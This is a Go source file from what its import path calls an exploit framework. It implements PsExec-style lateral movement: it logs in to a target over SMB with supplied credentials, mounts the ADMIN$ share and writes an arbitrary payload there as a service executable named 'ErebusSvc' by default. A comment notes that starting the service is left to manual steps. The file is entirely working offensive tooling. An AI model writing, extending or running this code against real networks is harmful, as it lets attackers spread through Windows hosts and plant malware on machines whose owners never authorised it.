package lateral

import (
	"context"
	"fmt"
	"net"

	"github.com/hirochachacha/go-smb2"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

func movePsExec(ctx context.Context, cfg *pb.LateralMoveConfig) (*pb.LateralMoveResult, error) {
	if cfg.Target == "" {
		return nil, fmt.Errorf("target required")
	}
	if cfg.Username == "" || cfg.Password == "" {
		return nil, fmt.Errorf("username and password required for PsExec")
	}

	// Connect to SMB
	addr := cfg.Target + ":445"
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("SMB connect to %s: %w", addr, err)
	}
	defer conn.Close()

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     cfg.Username,
			Password: cfg.Password,
			Domain:   cfg.Domain,
		},
	}

	s, err := d.Dial(conn)
	if err != nil {
		return nil, fmt.Errorf("SMB auth: %w", err)
	}
	defer s.Logoff()

	// Upload service binary to ADMIN$ share
	share, err := s.Mount(`\\` + cfg.Target + `\ADMIN$`)
	if err != nil {
		return nil, fmt.Errorf("mount ADMIN$: %w", err)
	}
	defer share.Umount()

	// Write payload if provided
	serviceName := cfg.ServiceName
	if serviceName == "" {
		serviceName = "ErebusSvc"
	}

	if len(cfg.Payload) > 0 {
		svcPath := serviceName + ".exe"
		f, err := share.Create(svcPath)
		if err != nil {
			return nil, fmt.Errorf("create service binary: %w", err)
		}
		_, err = f.Write(cfg.Payload)
		f.Close()
		if err != nil {
			return nil, fmt.Errorf("write service binary: %w", err)
		}
	}

	// SCM service creation requires DCE/RPC SVCCTL interface which is beyond
	// go-smb2's scope. Payload is staged; service creation is not yet automated.
	return &pb.LateralMoveResult{
		Method:  "psexec",
		Target:  cfg.Target,
		Success: len(cfg.Payload) > 0,
		Output:  fmt.Sprintf("payload staged to ADMIN$\\%s.exe via SMB (manual service creation required)", serviceName),
	}, nil
}
